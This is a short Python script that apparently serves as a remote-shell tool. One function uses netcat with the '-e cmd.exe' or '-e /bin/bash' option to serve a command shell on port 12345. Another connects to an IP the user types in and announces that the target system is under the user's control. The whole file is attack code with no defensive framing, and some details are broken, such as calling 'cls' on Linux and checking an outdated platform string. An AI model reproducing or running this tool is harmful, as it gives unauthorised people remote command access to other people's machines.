import sys
import os

def initiate_reverse_shell():
    if sys.platform == 'win32':
        os.system('cls')
        print("Operating System Platform Detected: "+sys.platform)
        print("Initiating Command Line Interface.....")
        print("Default Port: 12345")
        os.system('nc -nvlp 12345 -e cmd.exe')


    elif sys.platform == 'linux2':
        os.system('cls')
        print("Operating System Platform Detected: "+sys.platform)
        print("Initiating Bash Terminal.....")
        print("Default Port: 12345")
        os.system('nc -nvlp 12345 -e /bin/bash')


def get_reverse_shell():
    os.system('cls')
    ip = input("Enter the IP Address of Reverse Shell Initiater: ")
    command = "nc "+ip+" 12345"
    print("Connection Successfull: Target System is under your Control.")
    os.system(command)
